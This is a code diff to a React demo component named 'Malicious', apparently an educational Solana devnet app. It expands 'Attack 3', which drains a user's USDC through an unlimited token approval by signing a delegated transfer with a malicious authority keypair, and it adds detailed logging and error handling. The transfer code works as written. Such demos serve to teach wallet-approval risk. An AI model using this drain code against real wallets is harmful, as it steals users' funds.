@@ -495,7 +495,11 @@ const Malicious: React.FC = () => {
   // Attack 3: Exploit the unlimited approval to drain tokens
   const exploitUnlimitedApproval = async () => {
     if (!connected || !publicKey || !hasUnlimitedApproval || !MALICIOUS_AUTHORITY_KEYPAIR) {
-      addLog("No unlimited approval to exploit or missing malicious authority");
+      addLog("❌ Prerequisites not met:");
+      addLog(`  - Connected: ${connected}`);
+      addLog(`  - PublicKey: ${!!publicKey}`);
+      addLog(`  - Has Unlimited Approval: ${hasUnlimitedApproval}`);
+      addLog(`  - Malicious Authority: ${!!MALICIOUS_AUTHORITY_KEYPAIR}`);
       return;
     }
 
@@ -505,114 +509,196 @@ const Malicious: React.FC = () => {
     addLog("🎭 This simulates what a malicious smart contract would do automatically");
 
     try {
-      const fromTokenAccount = await getAssociatedTokenAddress(USDC_MINT, new PublicKey(publicKey));
+      // Add more detailed logging and validation
+      addLog("🔍 Checking malicious authority balance...");
+      const maliciousAuthorityBalance = await connection.getBalance(MALICIOUS_AUTHORITY_KEYPAIR.publicKey);
+      addLog(`💰 Malicious authority has ${maliciousAuthorityBalance / LAMPORTS_PER_SOL} SOL`);
+      
+      if (maliciousAuthorityBalance < 0.005 * LAMPORTS_PER_SOL) {
+        addLog("❌ ERROR: Malicious authority needs at least 0.005 SOL to pay transaction fees");
+        addLog("💡 In a real attack, the malicious contract would be pre-funded");
+        addLog("🔗 Fund the malicious authority using the web faucet above");
+        setIsLoading(false);
+        return;
+      }
+
+      addLog("🔍 Getting token account addresses...");
+      const userPubkey = new PublicKey(publicKey);
+      const maliciousPubkey = new PublicKey(maliciousReceiverWallet);
+      
+      const fromTokenAccount = await getAssociatedTokenAddress(
+        USDC_MINT, 
+        userPubkey,
+        true,
+        TOKEN_PROGRAM_ID,
+        ASSOCIATED_TOKEN_PROGRAM_ID
+      );
+      addLog(`📍 User token account: ${fromTokenAccount.toBase58().slice(0, 10)}...`);
+      
       const toTokenAccount = await getAssociatedTokenAddress(
         USDC_MINT,
-        new PublicKey(maliciousReceiverWallet)
+        maliciousPubkey,
+        true,
+        TOKEN_PROGRAM_ID,
+        ASSOCIATED_TOKEN_PROGRAM_ID
       );
+      addLog(`📍 Malicious token account: ${toTokenAccount.toBase58().slice(0, 10)}...`);
 
       // Check if user's token account exists and has balance
+      addLog("🔍 Checking user's token account...");
       const fromAccountExists = await checkTokenAccountExists(fromTokenAccount);
       if (!fromAccountExists) {
-        addLog("❌ User's USDC account doesn't exist. Cannot exploit.");
+        addLog("❌ ERROR: User's USDC account doesn't exist. Cannot exploit.");
+        addLog("💡 User needs to have USDC tokens first");
         setIsLoading(false);
         return;
       }
+      addLog("✅ User's token account exists");
 
-      // Check current balance
+      // Check current balance with detailed logging
+      addLog("🔍 Checking user's token balance...");
       const account = await getAccount(connection, fromTokenAccount);
       const actualBalance = Number(account.amount) / 1e6;
+      addLog(`💰 User has ${actualBalance} USDC in their account`);
+      addLog(`🎯 Attempting to drain ${usdcDrainAmount} USDC`);
+      
       const drainAmount = Math.min(usdcDrainAmount, actualBalance);
+      addLog(`📊 Will actually drain ${drainAmount} USDC`);
 
       if (drainAmount <= 0) {
-        addLog("❌ No USDC balance to drain.");
+        addLog("❌ ERROR: No USDC balance to drain.");
+        addLog("💡 User needs USDC tokens for this attack to work");
         setIsLoading(false);
         return;
       }
 
+      addLog("🏗️ Building exploitation transaction...");
       const exploitTx = new Transaction();
 
       // Check if malicious receiver's token account exists, create if not
+      addLog("🔍 Checking malicious receiver's token account...");
       const toAccountExists = await checkTokenAccountExists(toTokenAccount);
       if (!toAccountExists) {
+        addLog("📝 Creating token account for malicious receiver...");
         exploitTx.add(
           createAssociatedTokenAccountInstruction(
             MALICIOUS_AUTHORITY_KEYPAIR.publicKey, // malicious authority pays for account creation
             toTokenAccount,
-            new PublicKey(maliciousReceiverWallet),
+            maliciousPubkey,
             USDC_MINT
           )
         );
-        addLog("📝 Creating token account for malicious receiver...");
+        addLog("✅ Added account creation instruction");
+      } else {
+        addLog("✅ Malicious receiver already has token account");
       }
 
       // Transfer using the approved delegation - this is the key attack!
+      const transferAmount = Math.floor(drainAmount * 1e6); // Convert to proper decimal places
+      addLog(`💸 Adding transfer instruction for ${transferAmount} micro-USDC (${drainAmount} USDC)`);
+      
       exploitTx.add(
         createTransferInstruction(
           fromTokenAccount,
           toTokenAccount,
           MALICIOUS_AUTHORITY_KEYPAIR.publicKey, // The authority that was approved
-          Math.floor(drainAmount * 1e6) // Convert to proper decimal places
+          transferAmount
         )
       );
+      addLog("✅ Added token transfer instruction");
 
       // Set recent blockhash and fee payer
+      addLog("🔍 Getting latest blockhash...");
       const { blockhash } = await connection.getLatestBlockhash();
       exploitTx.recentBlockhash = blockhash;
       exploitTx.feePayer = MALICIOUS_AUTHORITY_KEYPAIR.publicKey;
+      addLog(`✅ Set blockhash: ${blockhash.slice(0, 10)}...`);
+      addLog(`✅ Set fee payer: ${MALICIOUS_AUTHORITY_KEYPAIR.publicKey.toBase58().slice(0, 10)}...`);
 
       addLog(`💸 Attempting to drain ${drainAmount.toFixed(2)} USDC using unlimited approval...`);
       addLog("🔑 Signing transaction with malicious contract authority...");
 
       try {
         // Sign with the malicious authority (simulating smart contract execution)
+        addLog("✍️ Signing transaction...");
         exploitTx.sign(MALICIOUS_AUTHORITY_KEYPAIR);
+        addLog("✅ Transaction signed successfully");
 
         // Send the signed transaction
-        const signature = await connection.sendRawTransaction(exploitTx.serialize());
+        addLog("📡 Sending transaction to network...");
+        const signature = await connection.sendRawTransaction(exploitTx.serialize(), {
+          skipPreflight: false,
+          preflightCommitment: 'confirmed'
+        });
+        addLog(`✅ Transaction sent with signature: ${signature.slice(0, 10)}...`);
 
         // Wait for confirmation
-        await connection.confirmTransaction(signature, "finalized");
-
-        addLog("💀 CRITICAL: Token drain successful! USDC stolen via transferFrom!");
-        if (signature) {
-          addLog(
-            <a
-              href={`https://explorer.solana.com/tx/${signature}?cluster=devnet`}
-              target="_blank"
-              rel="noopener noreferrer"
-              className="text-blue-600 hover:underline"
-            >
-              🔍 View Transaction
-            </a>
-          );
+        addLog("⏳ Waiting for transaction confirmation...");
+        const confirmation = await connection.confirmTransaction(signature, "finalized");
+        
+        if (confirmation.value.err) {
+          throw new Error(`Transaction failed: ${JSON.stringify(confirmation.value.err)}`);
         }
+        
+        addLog("💀 CRITICAL: Token drain successful! USDC stolen via transferFrom!");
+        addLog(
+          <a
+            href={`https://explorer.solana.com/tx/${signature}?cluster=devnet`}
+            target="_blank"
+            rel="noopener noreferrer"
+            className="text-blue-600 hover:underline"
+          >
+            🔍 View Transaction
+          </a>
+        );
         addLog("🔓 This happened because malicious contract used the unlimited approval");
         addLog("⚡ No additional user signature was required - approval was sufficient!");
 
         // Poll for up to 10 seconds for balance change
+        addLog("🔄 Refreshing balances...");
         const oldSol = solBalanceRef.current;
         const oldUsdc = usdcBalanceRef.current;
         for (let i = 0; i < 10; i++) {
           await new Promise((res) => setTimeout(res, 1000));
           await fetchBalances();
           if (solBalanceRef.current !== oldSol || usdcBalanceRef.current !== oldUsdc) {
+            addLog("✅ Balance change detected!");
             break;
           }
         }
-      } catch (error: any) {
-        console.error("Exploitation error:", error);
-        addLog(`✅ Exploitation blocked: ${error.message}`);
+        
+      } catch (txError: any) {
+        console.error("Transaction execution error:", txError);
+        addLog(`❌ Transaction failed: ${txError.message}`);
 
-        if (error.message.includes("insufficient funds")) {
-          addLog("💰 Malicious authority needs SOL to pay transaction fees");
+        if (txError.message.includes("insufficient funds")) {
+          addLog("💰 ERROR: Malicious authority needs more SOL to pay transaction fees");
           addLog("🎯 In real attacks, contracts are pre-funded or use flashloans");
+          addLog("💡 Fund the malicious authority using the web faucet above");
+        } else if (txError.message.includes("InvalidAccountData")) {
+          addLog("🔐 ERROR: Token approval might not exist or be insufficient");
+          addLog("💡 Make sure Phase 2 (unlimited approval) was completed successfully");
+        } else if (txError.message.includes("InsufficientFunds")) {
+          addLog("💰 ERROR: User doesn't have enough USDC tokens to drain");
+          addLog("💡 Get USDC from the faucet first");
         } else {
           addLog("🛡️ Wallet or network prevented token drainage!");
+          addLog(`🔍 Error details: ${txError.message}`);
         }
       }
     } catch (error: any) {
-      addLog(`Error during exploitation: ${error.message}`);
+      console.error("Overall exploitation error:", error);
+      addLog(`❌ Error during exploitation: ${error.message}`);
+      
+      if (error.message.includes("TokenOwnerOffCurveError")) {
+        addLog("🔐 ERROR: Wallet address is not a valid on-curve address");
+        addLog("💡 Try using a different wallet or creating a new account");
+      } else if (error.message.includes("TokenAccountNotFoundError")) {
+        addLog("💰 ERROR: Token account not found");
+        addLog("💡 Make sure you have USDC tokens in your wallet first");
+      } else {
+        addLog("🔍 This could be due to network issues, wallet protection, or missing setup");
+      }
     } finally {
       setIsLoading(false);
     }
